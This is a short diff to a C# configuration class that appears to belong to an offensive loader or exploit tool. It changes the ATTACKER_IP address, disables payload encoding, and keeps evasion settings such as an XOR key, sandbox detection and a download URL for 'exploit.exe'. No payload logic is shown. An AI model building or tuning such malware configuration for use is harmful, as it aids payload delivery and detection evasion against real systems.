@@ -5,7 +5,7 @@ using System.Runtime.InteropServices;
 public static class CONFIG
 {
     //Environment Variables
-    public static string ATTACKER_IP = "192.168.10.10";
+    public static string ATTACKER_IP = "192.168.200.227";
     public static string HTTP_PORT = "80";
     public static string HTTP_URL = $"http://{ATTACKER_IP}:{HTTP_PORT}";
     public static string BINARY_NAME = "exploit.exe";
@@ -13,7 +13,7 @@ public static class CONFIG
     public static string WAIT_TIME_SECONDS = "2";
 
     //Evasion
-    public static bool ENCODED = true;
+    public static bool ENCODED = false;
     public static byte KEY = 0xf4;
 
     public static bool DETECT_SANDBOX_TIME = true;
